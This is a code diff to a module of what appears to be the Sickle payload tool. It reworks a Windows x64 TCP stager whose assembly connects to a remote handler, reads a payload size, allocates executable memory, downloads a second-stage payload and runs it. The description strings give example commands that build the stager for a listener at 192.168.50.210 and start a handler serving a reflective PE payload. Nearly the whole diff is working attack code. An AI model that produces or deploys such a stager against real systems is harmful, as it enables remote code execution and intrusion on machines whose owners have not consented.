@@ -38,11 +38,16 @@ class Shellcode():
     summary = ("A lightweight stager that connects to a handler via TCP over IPv4 to receive and execute shellcode")
 
     description = ("This shellcode stub connects to a remote server handler over TCP, downloads a second-stage"
-                   " payload, and executes it.\n\n"
+                   " payload, and executes it. You can generate this initial stager using the following syntax."
+                   "\n\n"
 
-                   "Your handler can be as simple as combining Sickle and Netcat:\n\n"
+                   f"    {sys.argv[0]} -p windows/x64/virtualalloc_exec_tcp LHOST=192.168.50.210 LPORT=80 -f c"
+                   
+                   "\n\n"
 
-                   f"    {sys.argv[0]} -p windows/x64/reflective_pe EXE=/path/doom.exe -f raw | nc -lvp 8080\n\n"
+                   "Sickle can be used to start a handler as shown below:\n\n"
+
+                   f"    {sys.argv[0]} -m handler -p windows/x64/reflective_pe_loader EXE=/tmp/payload.exe HANDLER=tcp SRVHOST=192.168.50.210 SRVPORT=80\n\n"
 
                    "Upon execution of the first stage, you should get a connection from the target on your"
                    " handler. If using Netcat, hit [CTRL]+[C]. Upon doing so, your shellcode should execute"
@@ -56,11 +61,6 @@ class Shellcode():
     arguments["LPORT"] = {}
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
-
-    advanced = {}
-    advanced["ALLOCSIZE"] = {}
-    advanced["ALLOCSIZE"]["optional"] = "yes"
-    advanced["ALLOCSIZE"]["description"] = "Allocation size for second stage"
 
     def __init__(self, arg_object):
 
@@ -86,8 +86,8 @@ class Shellcode():
             "wsaData"                       : 0x00,
             "sockaddr_name"                 : 0x00,
             "sockfd"                        : 0x00,
-            "pResponse"                     : 0x00,
             "lpvShellcode"                  : 0x00,
+            "dwSize"                        : 0x00,
         })
 
         self.stack_space = builder.calc_stack_space(sc_args)
@@ -100,7 +100,6 @@ class Shellcode():
         """
    
         all_args = Shellcode.arguments
-        all_args.update(Shellcode.advanced)
         argv_dict = modparser.argument_check(all_args, self.arg_list)
         if (argv_dict == None):
             exit(-1)
@@ -112,16 +111,6 @@ class Shellcode():
             self.lport = int(argv_dict["LPORT"])
 
         self.lhost = argv_dict['LHOST']
-
-        # Set the initial allocation size and how much to recv per call
-        if "ALLOCSIZE" not in argv_dict.keys():
-            self.alloc_size = 0x3000
-        else:
-            self.alloc_size = int(argv_dict["ALLOCSIZE"], 16)
-
-        self.recv_size = 0x1000
-
-        return 0
 
     def gen_main(self):
         """Returns assembly source code for the main functionality of the stub
@@ -161,35 +150,30 @@ call_connect:
 
     xor rdx, rdx
     mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
-    mov [rbp - {self.storage_offsets['pResponse']}], rdx
+
+    lea rdx, [rbp - {self.storage_offsets['dwSize']}]
+    mov r8, 0x08 
+call_recv:
+    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
+    xor r9, r9
+    mov rax, [rbp - {self.storage_offsets['recv']}]
+    call rax
+
+    cmp rax, 0x10
+    jg download_complete
 
 call_VirtualAlloc:
-    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
-    mov rdx, {self.alloc_size}
+    mov rcx, [rbp - {self.storage_offsets['lpvShellcode']}]
+    mov rdx, [rbp - {self.storage_offsets['dwSize']}]
     mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
     mov r9, {winnt.PAGE_EXECUTE_READWRITE}
     mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
     call rax
 
-    mov [rbp - {self.storage_offsets['lpvShellcode']}] , rax
-    mov [rbp - {self.storage_offsets['pResponse']}], rax
+    mov [rbp - {self.storage_offsets['lpvShellcode']}], rax
+    mov rdx, rax
+    mov r8, [rbp - {self.storage_offsets['dwSize']}]
 
-call_recv:
-    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
-    mov r8, {self.recv_size}
-    xor r9, r9
-    mov rax, [rbp - {self.storage_offsets['recv']}]
-    call rax
-
-check_complete:
-    test eax, eax
-    jle download_complete
-
-inc_ptr:
-    mov r8, [rbp - {self.storage_offsets['pResponse']}]
-    add r8, rax
-    mov [rbp - {self.storage_offsets['pResponse']}], r8
     jmp call_recv
 
 download_complete:
